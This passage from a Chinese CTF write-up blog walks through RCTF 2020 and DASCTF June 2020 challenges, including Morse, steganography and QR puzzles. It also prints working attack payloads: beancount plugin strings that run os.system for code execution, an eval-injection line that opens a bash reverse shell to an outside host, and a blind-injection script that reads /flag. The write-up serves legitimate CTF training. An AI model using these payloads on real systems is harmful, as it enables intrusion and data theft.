class="keyword">if</span> hashlib.sha256(plain.encode()).hexdigest() == hash:</span><br><span class="line">            print(<span class="string">f"[+] code: <span class="subst">&#123;i&#125;</span>"</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql</span><span class="params">(payload:str=<span class="string">"select flag from flag --\x04"</span>)</span>:</span></span><br><span class="line">    url = <span class="string">'https://mysql-interface.rctf2020.rois.io'</span></span><br><span class="line">    <span class="comment"># payload = "select x"</span></span><br><span class="line">    powv = get_code()</span><br><span class="line">    data = &#123;<span class="string">"pow"</span>:(<span class="literal">None</span>, powv), <span class="string">"sql"</span>:(<span class="literal">None</span>, payload)&#125;</span><br><span class="line">    res = rq.post(url, files=data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    wl = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">127</span>):</span><br><span class="line">        i = chr(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">"\x00\t\n\v\f\r`~!@#$%^&amp;*()_=[]\&#123;\&#125;\\|:;'\"/?&lt;&gt;,\xa0"</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        wl.append(i)</span><br><span class="line">    print(wl)</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">sql()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sql(input(<span class="string">'sql&gt;'</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/01/tTdpD6F7v2ZY85n.png" alt="image-20200601093649227.png"></p>
<p>其它的解法还可以看看出题人的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RyM2VlL1JDVEYyMDIwL2Jsb2IvbWFzdGVyL215c3FsX2ludGVyZmFjZS9zb2x1dGlvbi9SRUFETUVfemgubWQ=">https://github.com/tr3ee/RCTF2020/blob/master/mysql_interface/solution/README_zh.md<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="bean"><a href="#bean" class="headerlink" title="bean"></a>bean</h3><p>账本rce</p>
<p>可以用plugin</p>
<p>使用方法 <span class="exturl" data-url="aHR0cHM6Ly9iZWFuY291bnQuZ2l0aHViLmlvL2RvY3MvMDZfYmVhbmNvdW50X2xhbmd1YWdlX3N5bnRheC5odG1sI3BsdWdpbnM=">https://beancount.github.io/docs/06_beancount_language_syntax.html#plugins<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>plugin “beancount.plugins.module_name” “configuration data”</p>
</blockquote>
<p>接着搜索github库 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JlYW5jb3VudC9iZWFuY291bnQ=">https://github.com/beancount/beancount<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>beancount/plugins/commodity_attr.py</li>
<li>beancount/plugins/check_average_cost.py</li>
<li>beancount/plugins/divert_expenses.py</li>
<li>beancount/plugins/ira_contribs.py</li>
</ul>
<p>发现这几个库都调用了<code>eval()</code></p>
<p>尝试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin &quot;beancount.plugins.commodity_attr&quot; &quot;__import__(&#39;os&#39;).system(&#39;ls&#39;)&quot;</span><br><span class="line">plugin &quot;beancount.plugins.check_average_cost&quot; &quot;__import__(&#39;os&#39;).system(&#39;ls&#39;)&quot;</span><br><span class="line">plugin &quot;beancount.plugins.divert_expenses&quot; &quot;__import__(&#39;os&#39;).system(&#39;ls&#39;)&quot;</span><br><span class="line">plugin &quot;beancount.plugins.ira_contribs&quot; &quot;__import__(&#39;os&#39;).system(&#39;ls&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>发现都可以rce</p>
<p>随便用一个getflag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">plugin &quot;beancount.plugins.check_average_cost&quot; &quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Animal"><a href="#Animal" class="headerlink" title="Animal"></a>Animal</h3><p><code>Message</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> Pin=<span class="number">8</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">pinMode</span>(Pin,<span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">()</span>  <span class="comment">// -.-. C</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">()</span>  <span class="comment">// --.- Q</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun3</span><span class="params">()</span>  <span class="comment">// -.. D</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun4</span><span class="params">()</span>  <span class="comment">// . E</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun5</span><span class="params">()</span>  <span class="comment">// -.- K</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun6</span><span class="params">()</span>  <span class="comment">// ... S</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun7</span><span class="params">()</span>  <span class="comment">// ---.. 8</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(Pin, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// CQDEKS8</span></span><br><span class="line">    fun1();</span><br><span class="line">    fun2();</span><br><span class="line">    fun1();</span><br><span class="line">    fun2();</span><br><span class="line">    fun1();</span><br><span class="line">    fun2();</span><br><span class="line">    fun3();</span><br><span class="line">    fun4();</span><br><span class="line">    fun5();</span><br><span class="line">    <span class="comment">// CQCQCQDEK</span></span><br><span class="line"></span><br><span class="line">    fun3();</span><br><span class="line">    fun4();</span><br><span class="line">    fun5();</span><br><span class="line">    <span class="comment">// DEK</span></span><br><span class="line"></span><br><span class="line">    fun7();</span><br><span class="line">    fun7();</span><br><span class="line">    <span class="comment">// 88</span></span><br><span class="line"></span><br><span class="line">    fun6();</span><br><span class="line">    fun5();</span><br><span class="line">    <span class="comment">// SK</span></span><br><span class="line"></span><br><span class="line">    fun6();</span><br><span class="line">    fun5();</span><br><span class="line">    <span class="comment">// SK</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>摩斯电报，高电平延时500ms代表 <code>-</code> ，高电平延时200代表 <code>.</code></p>
<p>具体解码看上面注释</p>
<p>拼起来就是<code>CQCQCQDEKDEK88SKSK</code></p>
<p>根据以下资料</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cDovL2Jsb2cuc2luYS5jb20uY24vcy9ibG9nXzRiOGU2MTYwMDEwMGFsNW0uaHRtbA==">http://blog.sina.com.cn/s/blog_4b8e61600100al5m.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9ub3RlLzI0OTMzMDczNy8=">https://www.douban.com/note/249330737/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy53ZW5kYW5na3UubmV0L2RvYy9lYjkzZDE2ZTU4ZmFmYWIwNjlkYzAyODgtNC5odG1s">http://www.wendangku.net/doc/eb93d16e58fafab069dc0288-4.html<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>解出电报码的含义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CQCQCQ(seek you *3 ) DE(from of) K DE(from of) K 88 SK(over) SK(over)</span><br></pre></td></tr></table></figure>

<p>主体消息部分是 <code>88</code>，含义是<code>love and kisses</code></p>
<p>尝试密码 <code>Love and kisses</code> 解出压缩包，得到一个蓝牙日志和QR码</p>
<p>用wireshark提取蓝牙日志，得到以下资源</p>
<ul>
<li>S00429-15114219.png</li>
<li>_0ServerSendToService.txt</li>
<li>1.png</li>
<li>secret.jpg</li>
</ul>
<p>其中最让人在意的莫过于那张secret.jpg</p>
<p><img src="https://i.loli.net/2020/06/01/cILsSQxVAhptvHY.jpg" alt="secret.jpg"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide extract -sf secret.jpg</span><br></pre></td></tr></table></figure>

<p>使用 <code>steghide</code> 无密码，解出 <code>flag.txt</code></p>
<p>内容为一串base64: <code>aHR0cHMlM0EvL216bC5sYS8yV0VqbjVh</code></p>
<p>解码得到: <code>https://mzl.la/2WEjn5a</code></p>
<p>是一个 EmojiEncrypt 的网站</p>
<p>这里可以选择一个个去尝试，奇怪的是这里不是正确的emoji也能得到flag（复制到剪切板发现其实多了一堆emoji），然后解出 <code>RCTF{N0t_1s_@_B@ss}</code></p>
<p>还有一条正道就是解决QRcode的难题，这里这个QRcode不能通过正常的方法扫描</p>
<p>（这里吹一下QQ，扫出来了一堆东西，虽然是乱码，但是证明是有东西的</p>
<p><img src="https://i.loli.net/2020/06/01/13KWgJDifbzytLn.png" alt="QR.png"></p>
<p>我们可以通过 <span class="exturl" data-url="aHR0cHM6Ly96eGluZy5vcmcvdy9kZWNvZGUuanNweA==">ZXing<i class="fa fa-external-link-alt"></i></span> 扫出来Hex码</p>
<p>如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4026c51005100fe56477232003000320030003000350030003800310033003400300020003100780031000000b6ec55006e006b006e006f0077006e0000000000000044c555006e006b006e006f0077006e000000000000001931cf8582c545bfc6d543c3afbfcfdfefcc0aa1001a220500000015222222222222222211211205000000152222222222222222222212050000001522a1212222222222222212050000001622002122222222222222140500000015221121222222222222221400000000152222222222222222224458000000001522222222222222224484010000000040444424222222424484480000000000a08888884844848888885400000000000081888888888888881800000000000000a0414444444444110500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ec11ec11</span><br></pre></td></tr></table></figure>

<p>保存为文件</p>
<p><img src="https://i.loli.net/2020/06/01/ZB7MNutiQfmre4Y.png" alt="image.png"></p>
<p>发现这个图形挺抽象的，尝试编写脚本将其转成图片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'QR.dat'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dat = f.read()</span><br><span class="line">print(dat)</span><br><span class="line">img = Image.new(<span class="string">'L'</span>,(<span class="number">160</span>,<span class="number">400</span>),(<span class="number">255</span>))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;len(dat):</span><br><span class="line">    p = Image.new(<span class="string">'L'</span>,(<span class="number">10</span>,<span class="number">10</span>),(dat[i]))</span><br><span class="line">    img.paste(p,((i%<span class="number">16</span>)*<span class="number">10</span>,(i//<span class="number">16</span>)*<span class="number">10</span>,(i%<span class="number">16</span>)*<span class="number">10</span>+<span class="number">10</span>,(i//<span class="number">16</span>)*<span class="number">10</span>+<span class="number">10</span>))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">img.save(<span class="string">'out.png'</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/01/yBpcCvdVuqQ8H4l.png" alt="out.png"></p>
<p>得到一条喷水的鲸，所以解码的emoji就是鲸</p>
<p><img src="https://i.loli.net/2020/06/01/fq2ei1waJoDYskC.png" alt="image.png"></p>
<p>解码之后同样得到 <code>RCTF{N0t_1s_@_B@ss}</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>rctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020_DASCTF_六月部分wp</title>
    <url>/2020/06/26/2020-6-DASCTF-%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>web随便水了几道题</p>
<h3 id="简单的计算题1"><a href="#简单的计算题1" class="headerlink" title="简单的计算题1"></a>简单的计算题1</h3><p>一开始的源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>只过滤了<code>or</code>，这可操作性就大了</p>
<p>回显只能判断结果<code>True</code>还是<code>False</code>亦或者报错</p>
<p>这种时候有两种思路，一是反弹shell，二是盲注</p>
<ul>
<li><p>反弹shell</p>
<p>经过简单的测试，<code>open().write()</code>和<code>os.system()</code>可以用，所以直接填上这个提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1,open(&#39;&#x2F;tmp&#x2F;c.sh&#39;,&#39;w&#39;).write(&#39;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;jeffz.cn&#x2F;6009 0&gt;&amp;1&#39;),os.system(&#39;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;c.sh&#39;)</span><br></pre></td></tr></table></figure>

<p>然后本地nc监听就能拿到shell</p>
</li>
</ul>
<p>然后后面修复了可以反弹shell的bug，但是我们还是可以命令盲注</p>
<p>修复后的源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> black_list,create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> black_word <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> black_word <span class="keyword">in</span> string:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>盲注</p>
<p>经过简单的测试，发现<code>open().read()</code>没有被ban，所以可以利用这个来盲注</p>
<p>以下是最主要的payload，然后再写个脚本自动答题就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">f" and bool(open('/flag').read()[<span class="subst">&#123;x&#125;</span>]&gt;chr(<span class="subst">&#123;mid&#125;</span>))"</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">x=<span class="number">-1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    low = <span class="number">8</span></span><br><span class="line">    high = <span class="number">130</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">f" and bool(open('/flag').read()[<span class="subst">&#123;x&#125;</span>]&gt;chr(<span class="subst">&#123;mid&#125;</span>))"</span></span><br><span class="line">            r = 